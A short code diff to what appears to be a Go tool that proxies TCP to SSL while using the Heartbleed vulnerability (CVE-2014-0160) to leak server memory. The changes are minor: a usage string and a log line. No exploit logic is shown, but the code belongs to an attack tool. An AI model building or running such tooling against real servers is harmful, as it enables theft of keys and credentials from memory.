@@ -29,7 +29,7 @@ var usageMessage = `Datapipe TCP->SSL using the Heartbleed attack (CVE-2014-0160
 
 Usage:
 
-	%s listenport server_name:port leaksize
+	%s listenport server_name:port <leaksize>
 	
 `
 
@@ -231,7 +231,7 @@ func collectHeartBeats(err error, target *tls.Conn, finished chan bool, lock cha
 
 func proxyConn (client net.Conn, host string) {
 	
-	log.Println("New connection from: "+host)
+	log.Println("New connection from: "+client.RemoteAddr().String())
 	net_conn, err := net.DialTimeout("tcp", host, 3*time.Second)
 	if err != nil {
 		return
